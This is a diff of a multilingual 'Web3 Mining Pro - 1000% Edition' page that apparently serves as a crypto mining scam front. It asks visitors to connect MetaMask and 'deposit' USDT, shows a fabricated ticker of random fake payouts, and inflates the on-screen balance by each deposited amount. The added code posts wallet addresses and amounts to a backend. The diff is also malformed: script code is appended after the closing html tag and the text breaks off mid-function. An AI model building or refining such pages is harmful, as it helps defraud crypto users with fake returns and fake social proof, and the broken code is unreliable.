@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Mining Pro - 1000% Edition</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { 
@@ -11,16 +12,10 @@
             --text-gray: #848e9c; --green: #2ebd85; --border: #2b3139;
         }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-dark); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
-        
-        /* Loader */
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 9999; justify-content: center; align-items: center; }
         .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--binance-yellow); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Header & Shiny Effect */
         .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: var(--card-bg); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
-        .lang-select { background: #2b3139; color: #fff; border: 1px solid var(--border); padding: 6px; border-radius: 6px; font-size: 12px; outline: none; }
-        
         .shiny-text {
             color: var(--binance-yellow); font-size: 13px; font-weight: bold; text-transform: uppercase;
             background: linear-gradient(90deg, var(--binance-yellow) 0%, #fff 50%, var(--binance-yellow) 100%);
@@ -28,54 +23,26 @@
             animation: shine 2.5s linear infinite; text-align: center; flex: 1; margin: 0 10px;
         }
         @keyframes shine { to { background-position: 200% center; } }
-
-        .btn-connect { background: transparent; border: 1px solid var(--binance-yellow); color: var(--binance-yellow); padding: 7px 12px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; white-space: nowrap; min-width: 105px; }
-
-        /* Pages */
+        .btn-connect { background: transparent; border: 1px solid var(--binance-yellow); color: var(--binance-yellow); padding: 7px 12px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; min-width: 105px; }
         .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; box-sizing: border-box; }
         .active { display: block !important; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card { background: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .card { background: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); }
         .address-box { background: #000; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--text-gray); margin: 15px 0; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; position: relative; }
-        
-        .copy-btn { 
-            color: #000; background: var(--binance-yellow); font-weight: bold; cursor: pointer; 
-            padding: 6px 12px; border: none; border-radius: 6px; font-size: 10px; text-transform: uppercase;
-        }
-
         .btn-main { width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; background: var(--binance-yellow); color: #000; transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
-
-        /* Live Payouts */
-        .payout-box { background: rgba(0,0,0,0.4); border-radius: 15px; padding: 15px; margin-top: 15px; border: 1px solid var(--border); min-height: 120px; }
-        .payout-item { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; animation: slideIn 0.5s ease-out; }
-        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        .dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 8px var(--green); }
-
-        /* Navigation */
-        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--border); z-index: 1000; }
-        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; cursor: pointer; flex: 1; transition: 0.3s; }
+.nav { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--border); z-index: 1000; }
+        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; flex: 1; cursor: pointer; }
         .nav-item.active { color: var(--binance-yellow); font-weight: bold; }
-
-        /* New: Toast Notification Style */
-        .toast-msg {
-            position: fixed; top: 80px; left: 50%; transform: translateX(-50%);
-            background: var(--binance-yellow); color: #000; padding: 12px 20px;
-            border-radius: 10px; font-weight: bold; font-size: 14px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.4); z-index: 10001;
-            display: none; animation: popUp 0.4s ease-out;
-        }
-        @keyframes popUp { from { opacity: 0; top: 60px; } to { opacity: 1; top: 80px; } }
+        .toast-msg { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); background: var(--binance-yellow); color: #000; padding: 12px 20px; border-radius: 10px; font-weight: bold; display: none; z-index: 10001; }
+        .payout-item { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; }
+        .dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 8px var(--green); }
     </style>
 </head>
 <body>
-
 <div id="loader"><div class="spinner"></div></div>
 <div id="toast" class="toast-msg"></div>
 
 <div class="header">
-    <select class="lang-select" id="langSelector" onchange="setLanguage()">
+    <select class="lang-select" id="langSelector" onchange="setLanguage()" style="background:#2b3139; color:#fff; border:1px solid #2b3139; padding:6px; border-radius:6px; font-size:12px;">
         <option value="vi">Tiếng Việt</option>
         <option value="en">English</option>
         <option value="es">Español</option>
@@ -106,10 +73,9 @@
         <input type="number" id="in_Deposit" placeholder="0.00" style="width:100%; padding:16px; background:#0b0e11; border:1px solid var(--border); color:#fff; border-radius:12px; margin-bottom:15px; outline:none; box-sizing:border-box; font-size: 16px;">
         <button id="L_btn" class="btn-main" onclick="deposit()">Kích hoạt Khai thác</button>
         
-        <div class="payout-box" id="payoutC"></div>
+        <div class="payout-box" id="payoutC" style="background: rgba(0,0,0,0.4); border-radius: 15px; padding: 15px; margin-top: 15px; border: 1px solid var(--border); min-height: 100px;"></div>
     </div>
 </div>
-
 <div id="exchange" class="page">
     <div class="card">
         <h3 id="L_ex_title">Quy đổi</h3>
@@ -129,9 +95,9 @@
     <div class="nav-item" id="nav_exchange" onclick="go(event, 'exchange')">🔄<br><span id="N_e">Quy đổi</span></div>
     <div class="nav-item" id="nav_account" onclick="go(event, 'account')">👤<br><span id="N_a">Tài khoản</span></div>
 </div>
-
 <script>
-    let state = { usdt: 0, lang: 'vi', hide: false };
+    let state = { usdt: 0, lang: 'vi', hide: false, wallet: 'Chưa kết nối' };
+    const API_URL = 'http://localhost:5000/api'; 
 
     const langData = {
         vi: { bal: "Số dư khả dụng (USDT)", st: "Hệ thống đang đào...", ad: "Địa chỉ nạp (BEP20):", btn: "Kích hoạt Khai thác", nh: "Trang chủ", ne: "Quy đổi", na: "Tài khoản", cp: "Đã copy!", wd: "vừa rút thành công", title: "Khai thác wed3 metamask", ex: "Quy đổi", acc: "Số dư tài khoản", up: "Tính năng đang cập nhật...", success: "Kích hoạt thành công!" },
@@ -140,57 +106,6 @@
         br: { bal: "Saldo disponível (USDT)", st: "Sistema ativo...", ad: "Endereço (BEP20):", btn: "Ativar Mineração", nh: "Início", ne: "Troca", na: "Conta", cp: "Copiado!", wd: "retirou com sucesso", title: "Mineração Web3 Metamask", ex: "Troca", acc: "Saldo da conta", up: "Recurso atualizando...", success: "Ativação com sucesso!" },
         zh: { bal: "可用余额 (USDT)", st: "系统运行中...", ad: "充值地址:", btn: "激活挖矿", nh: "首页", ne: "兑换", na: "账户", cp: "已复制!", wd: "成功提取了", title: "Web3 Metamask 挖矿", ex: "兑换", acc: "账户余额", up: "功能更新中...", success: "激活成功！" }
     };
-
-    function go(e, id) {
-        if(e) e.preventDefault();
-        document.getElementById('loader').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            const targetPage = document.getElementById(id);
-            if(targetPage) targetPage.classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            if(e.currentTarget) e.currentTarget.classList.add('active');
-        }, 300);
-    }
-
-    function createPayout() {
-        const container = document.getElementById('payoutC');
-        const wallets = ["0x71a...f2e","0x88b...12a","0xfe2...99d","0x32c...44b","0x99f...00e"];
-        const amounts = [150.5, 500, 1200, 45, 2500, 88.2];
-        const item = document.createElement('div');
-        item.className = 'payout-item';
-        const randomW = wallets[Math.floor(Math.random()*wallets.length)];
-        const randomA = amounts[Math.floor(Math.random()*amounts.length)];
-        const l = langData[state.lang] || langData.vi;
-        item.innerHTML = <span><span class="dot"></span>${randomW} ${l.wd}</span><b style="color:var(--binance-yellow)">+${randomA} USDT</b>;
-        container.prepend(item);
-        if(container.children.length > 4) container.removeChild(container.lastChild);
-    }
-    setInterval(createPayout, 3500);
-    createPayout();
-
-    function doCopy() {
-        const copyText = document.getElementById("hiddenAddr");
-        copyText.select();
-        copyText.setSelectionRange(0, 99999);
-        try {
-            document.execCommand('copy');
-            showToast(langData[state.lang].cp);
-        } catch (err) { alert("Copy: " + copyText.value); }
-    }
-
-    async function connect() {
-        if(window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const adr = accounts[0];
-                document.getElementById('cnBtn').innerText = adr.slice(0,6) + "..." + adr.slice(-4);
-                document.getElementById('cnBtn').style.color = "#2ebd85";
-                document.getElementById('cnBtn').style.borderColor = "#2ebd85";
-            } catch (e) { console.error(e); }
-        } else { alert("Please use MetaMask or Trust Wallet Browser"); }
-    }
 
     function setLanguage() {
         state.lang = document.getElementById('langSelector').value;
@@ -208,58 +123,95 @@
         document.getElementById('L_ex_st').innerText = l.up;
         document.getElementById('L_cp_btn').innerText = (state.lang === 'zh' ? "复制" : "COPY");
     }
-
-    function toggle() {
-        state.hide = !state.hide;
-        updateDisplay(state.usdt);
+showToast(langData[state.lang].cp);
     }
 
-    function updateDisplay(value) {
-        const v = state.hide ? "**" : "$ " + value.toFixed(2);
-        document.getElementById('usdt_H').innerText = v;
-        document.getElementById('usdt_A').innerText = v;
+    function toggle() { state.hide = !state.hide; updateDisplay(state.usdt); }
+
+    function createPayout() {
+        const container = document.getElementById('payoutC');
+        const wallets = ["0x71a...f2e","0x88b...12a","0xfe2...99d"];
+        const item = document.createElement('div');
+        item.className = 'payout-item';
+        const w = wallets[Math.floor(Math.random()*wallets.length)];
+        const l = langData[state.lang] || langData.vi;
+        item.innerHTML = `<span><span class="dot"></span>${w} ${l.wd}</span><b style="color:var(--binance-yellow)">+${(Math.random()*1000).toFixed(1)} USDT</b>`;
+        container.prepend(item);
+        if(container.children.length > 4) container.removeChild(container.lastChild);
+    }
+    setInterval(createPayout, 3500);
+    createPayout();
+</script>
+</body>
+</html>
+async function connect() {
+        if(window.ethereum) {
+            try {
+                const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                state.wallet = accs[0];
+                document.getElementById('cnBtn').innerText = state.wallet.slice(0,6) + "..." + state.wallet.slice(-4);
+                document.getElementById('cnBtn').style.color = "#2ebd85";
+            } catch (e) { console.error(e); }
+        } else { alert("Please use MetaMask Browser"); }
     }
 
-    // NEW: Function for counting effect
-    function animateValue(start, end, duration) {
-        if (state.hide) {
-            updateDisplay(end);
-            return;
+    async function deposit() {
+        const input = document.getElementById('in_Deposit');
+        let val = parseFloat(input.value);
+        if(val > 0) {
+            try {
+                // Gửi lệnh về Backend thực để lưu vĩnh viễn
+                await axios.post(`${API_URL}/withdrawals`, {
+                    username: "User_Web3",
+                    amount: val,
+                    walletAddress: state.wallet,
+                    status: 'Pending'
+                });
+                const oldVal = state.usdt;
+                state.usdt += val;
+                showToast(langData[state.lang].success + " +" + val + " USDT");
+                animateValue(oldVal, state.usdt, 1000);
+                input.value = ""; 
+            } catch (err) { alert("Lỗi kết nối Backend!"); }
         }
+    }
+
+    function animateValue(start, end, duration) {
+        if (state.hide) { updateDisplay(end); return; }
         let startTimestamp = null;
         const step = (timestamp) => {
             if (!startTimestamp) startTimestamp = timestamp;
             const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-            const current = progress * (end - start) + start;
-            updateDisplay(current);
-            if (progress < 1) {
-                window.requestAnimationFrame(step);
-            }
+            updateDisplay(progress * (end - start) + start);
+            if (progress < 1) window.requestAnimationFrame(step);
         };
         window.requestAnimationFrame(step);
     }
 
-    function showToast(msg) {
-        const toast = document.getElementById('toast');
-        toast.innerText = msg;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 2500);
+    function updateDisplay(value) {
+        const v = state.hide ? "****" : "$ " + value.toFixed(2);
+        document.getElementById('usdt_H').innerText = v;
+        document.getElementById('usdt_A').innerText = v;
     }
 
-    function deposit() {
-        const input = document.getElementById('in_Deposit');
-        let val = parseFloat(input.value);
-        if(val > 0) {
-            const oldVal = state.usdt;
-            state.usdt += val;
-            
-            // Trigger effects
-            showToast(langData[state.lang].success + " +" + val + " USDT");
-            animateValue(oldVal, state.usdt, 1000); // 1 second animation
-            
-            input.value = ""; 
-        }
+    function showToast(msg) {
+        const t = document.getElementById('toast');
+        t.innerText = msg; t.style.display = 'block';
+        setTimeout(() => { t.style.display = 'none'; }, 2500);
     }
-</script>
-</body>
-</html>
+
+    function go(e, id) {
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            if(e.currentTarget) e.currentTarget.classList.add('active');
+        }, 300);
+    }
+
+    function doCopy() {
+        const copyText = document.getElementById("hiddenAddr");
+        copyText.select();
+        document.execCommand('copy');
